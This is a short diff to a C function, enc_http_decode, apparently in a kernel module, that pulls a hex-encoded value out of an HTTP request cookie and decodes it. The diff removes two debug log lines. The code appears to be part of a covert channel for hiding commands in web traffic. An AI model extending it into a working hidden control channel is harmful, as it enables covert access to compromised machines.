@@ -20,7 +20,6 @@ static int enc_http_decode(const u8 *req_buf, size_t req_buflen, u8 **res_buf, s
     size_t cookie_size;
 
     search_start = strnstr(req_buf, SEARCH_STRING, req_buflen);
-    NETKIT_LOG("[*]{enc_http_decode} search start: %pk\n", &search_start);
     if (search_start == NULL)
         return -EINVAL;
 
@@ -28,8 +27,6 @@ static int enc_http_decode(const u8 *req_buf, size_t req_buflen, u8 **res_buf, s
 
     // strchr but with multiple chars, and stop when buflen is met
     for (cookie_size = 0; (void*)(cookie_start + cookie_size) < (void*)(req_buf + req_buflen) && IS_HASH(cookie_start[cookie_size]); cookie_size++);
-
-    NETKIT_LOG("[*]{enc_http_decode} cookie size: %lu\n", cookie_size);
 
     return hex_decode(cookie_start, cookie_size, res_buf, res_buflen);
 }
